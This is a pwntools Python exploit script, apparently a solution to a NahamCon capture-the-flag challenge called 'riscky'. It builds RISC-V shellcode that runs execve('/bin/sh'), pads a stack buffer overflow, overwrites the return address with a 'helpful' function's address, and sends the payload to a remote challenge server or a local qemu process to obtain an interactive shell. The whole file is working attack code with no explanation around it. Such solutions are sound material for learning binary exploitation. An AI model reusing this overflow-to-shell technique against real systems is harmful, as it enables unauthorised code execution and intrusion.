#!/usr/bin/env python3

from pwn import *

binary = ELF('./riscky', checksec=False)
context.arch = 'riscv'
context.bits = 64

if args.REMOTE:
	p = remote('challenge.nahamcon.com', 30533)
else:
	if args.D:
		p = process('qemu-riscv64 -g 9000 -L /usr/riscv64-linux-gnu riscky'.split())
	else:
		p = process('qemu-riscv64 riscky'.split())

# https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html
shellcode = asm(f'''
li s1, {'0x' + bytes.hex(b'/bin/sh'[::-1])}
sd s1, -16(sp)              # Store dword s1 on the stack
addi a0,sp,-16              # a0 = filename = sp + (-16)
slt a1,zero,-1              # a1 = argv set to 0
slt a2,zero,-1              # a2 = envp set to 0
li a7, 221                  # execve = 221
ecall                       # Do syscall
''')

if args.D: print(disasm(shellcode))

payload  = b''
payload += (520 - 8) * b'A'
payload += p64(binary.sym.helpful)
payload += shellcode

p.sendlineafter(b'> ', payload)
p.interactive()
